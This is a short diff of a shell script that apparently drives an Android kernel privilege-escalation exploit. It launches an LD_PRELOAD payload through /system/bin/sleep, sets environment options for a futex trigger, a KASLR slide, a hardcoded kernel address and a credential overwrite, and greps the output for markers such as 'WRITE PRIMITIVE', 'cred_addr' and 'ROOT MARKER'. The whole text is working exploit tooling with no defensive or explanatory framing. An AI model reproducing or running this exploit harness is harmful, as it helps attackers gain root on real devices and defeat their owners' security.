@@ -35,9 +35,8 @@ rm -f $RUNLOG
 timeout 150 env \
   PSELECT_SLIDE_TRIGGER=1 \
   PSELECT_RETRY=1 \
-  PSELECT_TREE_PC=ffffff80028a77c8 \
+  PSELECT_TREE_PC=ffffff8002a60bb0 \
   PSELECT_TREE_LEFT=0 \
-  PSELECT_SKIP_WARMUP=1 \
   LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
 echo "round0 rc=$?" >> $LOG
 grep -a 'WRITE PRIMITIVE\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
@@ -58,9 +57,9 @@ for W in $WINS; do
   timeout 150 env \
     PSELECT_SLIDE_TRIGGER=1 \
     PSELECT_CRED=1 \
+    PSELECT_PERF_CRED=1 \
     PSELECT_RETRY=1 \
     PSELECT_UID_WIN=$W \
-    PSELECT_SKIP_WARMUP=1 \
     LD_PRELOAD=$DST /system/bin/sleep 100 > $RUNLOG 2>&1
   echo "round=$R win=$W rc=$?" >> $LOG
   grep -a 'mt46:\|mt40:\|mt33:\|CHILD-ROOT\|ROOT MARKER\|futex trigger\|SLIDE page\|cred_addr' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
